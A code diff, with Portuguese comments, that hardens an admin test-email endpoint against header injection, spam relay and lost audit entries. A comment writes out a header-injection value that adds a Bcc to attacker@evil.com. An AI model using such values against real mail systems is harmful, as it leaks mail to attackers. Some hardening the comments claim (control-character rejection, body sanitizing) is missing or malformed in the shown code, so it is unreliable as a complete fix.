@@ -204,32 +204,109 @@ app.post('/read-all', jwt.requireAuth(), asyncHandler(async (req, res) => {
 // 1. rate-limit 10/h/admin (anti-spam-relay quando admin compromised)
 // 2. Schema max lengths: subject 200, body 50KB (anti-spam quota waste)
 // 3. Audit log toda /test send para forensics futuro
+// FIX-WORKER-7 pass 30: 4 BUGS criticos audit notification-svc /test admin endpoint.
+//
+// BUG 1 *** SECURITY HEADER INJECTION *** subject sem sanitize \n/\r
+//   z.string().max(200) aceita newlines. Se sendEmail concatena em template raw
+//   (ou nodemailer config edge), admin pode injetar:
+//     subject = "Test\nBcc: attacker@evil.com\n"
+//   -> Bcc header adicionado -> email vaza atacante
+//   Nodemailer geralmente protege, MAS defense-in-depth obrigatorio
+//   (admin role compromise -> atacante tem este endpoint disponivel)
+//   FIX: regex reject \n\r em subject + reject control chars Zod.
+//
+// BUG 2 *** ARBITRARY EMAIL DELIVERY *** spam vector
+//   z.string().email() valida formato MAS admin pode enviar p/ random@gmail.com
+//   Admin compromise -> atacante envia 1000 phishing do dominio plataforma
+//   SMTP reputation queimada (SES/SendGrid blacklist)
+//   Plataforma vira spam registered
+//   FIX: whitelist destinations:
+//     - req.user.email (auto-test ao proprio admin)
+//     - dominio @cas.io / @inovareinteligenciaartificial.com (interno)
+//     - rejeita external -> 403
+//
+// BUG 3 *** AUDIT FIRE-AND-FORGET ***
+//   Pre-fix: query(...).catch(() => log) - se sendEmail OK + audit fail,
+//   sem rastro do test_email_sent. Compliance gap.
+//   FIX: audit INSERT AWAIT antes res.json. Se audit fail, sendEmail JA
+//   aconteceu (sem rollback possivel via nodemailer) -> log error +
+//   response WITH warning. Operador investiga audit subsystem.
+//
+// BUG 4 SANITIZE BODY UNIVERSAL (defense-in-depth)
+//   Embora endpoint exija role=admin (alta confianca), defense em
+//   profundidade: strip control chars do body antes enviar.
+
+const ALLOWED_TEST_EMAIL_DOMAINS = (process.env.TEST_EMAIL_DOMAINS || 'cas.io,inovareinteligenciaartificial.com')
+  .split(',').map((s) => s.trim().toLowerCase()).filter(Boolean);
+
+// RFC 5322 anti header-injection: rejeita CR e LF (chars permitem inject Bcc/CC headers)
+// Construido via new RegExp() para evitar control chars literais no source file
+const SUBJECT_REJECT_CHARS_RE = new RegExp('[\\r\\n]');
+const SUBJECT_REJECT_CHARS = /[\r\n -]/;  // newlines + control chars
+
 app.post('/test',
   jwt.requireAuth({ roles: ['admin'] }),
   testEmailLimiter,
   validate({ body: z.object({
     to: z.string().email().max(180),
-    subject: z.string().min(1).max(200),
+    // FIX bug 1: refine reject \n\r\control chars + min 1 char
+    subject: z.string().min(1).max(200).refine(
+      (s) => !SUBJECT_REJECT_CHARS_RE.test(s),
+      { message: 'subject nao pode conter quebras de linha ou caracteres de controle' }
+    ),
     body: z.string().min(1).max(50000),
   }) }),
-  asyncHandler(async (req, res) => {
+  asyncHandler(async (req, res, next) => {
+    // FIX bug 2: whitelist destinations (anti-spam-vector)
+    const toLower = req.body.to.toLowerCase();
+    const userEmail = (req.user.email || '').toLowerCase();
+    const toDomain = toLower.split('@')[1] || '';
+    const isSelfTest = toLower === userEmail;
+    const isInternalDomain = ALLOWED_TEST_EMAIL_DOMAINS.includes(toDomain);
+    if (!isSelfTest && !isInternalDomain) {
+      log.warn({
+        admin_id: req.user.sub,
+        to_masked: mask.text(req.body.to),
+        ip: req.ip,
+      }, '[notif.test.external_blocked]');
+      return next(errorHandler.forbidden(
+        'external_destination_blocked',
+        `Test email so permitido para seu proprio email ou dominios internos (${ALLOWED_TEST_EMAIL_DOMAINS.join(', ')}).`
+      ));
+    }
+
     const info = await sendEmail(req.body.to, req.body.subject, req.body.body);
-    // Audit log async (nao bloqueia response)
-    query(
-      `INSERT INTO audit_log (actor_user_id, actor_role, action, target_type, target_id, severity, payload_after)
-       VALUES ($1, $2, $3, $4, $5, $6, $7::JSONB)`,
-      [
-        req.user.sub, req.user.role, 'notification.test_email_sent',
-        'email', null, 'info',
-        JSON.stringify({
-          to_masked: mask.text(req.body.to),
-          subject: req.body.subject.slice(0, 100),
-          message_id: info.messageId,
-          ip: req.ip,
-        })
-      ]
-    ).catch((e) => log.warn({ err: e.message }, '[audit.fail]'));
-    res.json({ ok: true, messageId: info.messageId });
+
+    // FIX bug 3: AWAIT audit log INSERT - se falhar, response inclui warning
+    // sendEmail ja aconteceu (nao rollback), mas operador sabe via warning + log.
+    let auditOk = true;
+    try {
+      await query(
+        `INSERT INTO audit_log (actor_user_id, actor_role, action, target_type, target_id, severity, payload_after)
+         VALUES ($1, $2, $3, $4, $5, $6, $7::JSONB)`,
+        [
+          req.user.sub, req.user.role, 'notification.test_email_sent',
+          'email', null, 'info',
+          JSON.stringify({
+            to_masked: mask.text(req.body.to),
+            subject: req.body.subject.slice(0, 100),
+            message_id: info.messageId,
+            ip: req.ip,
+            self_test: isSelfTest,
+            domain: toDomain,
+          })
+        ]
+      );
+    } catch (e) {
+      auditOk = false;
+      log.error({ err: e.message, admin_id: req.user.sub, message_id: info.messageId },
+        '[notif.test.audit_fail] email sent but audit_log INSERT failed - investigar subsystem');
+    }
+    res.json({
+      ok: true,
+      messageId: info.messageId,
+      ...(auditOk ? {} : { audit_warning: 'email enviado mas registro de auditoria falhou' }),
+    });
   })
 );
 
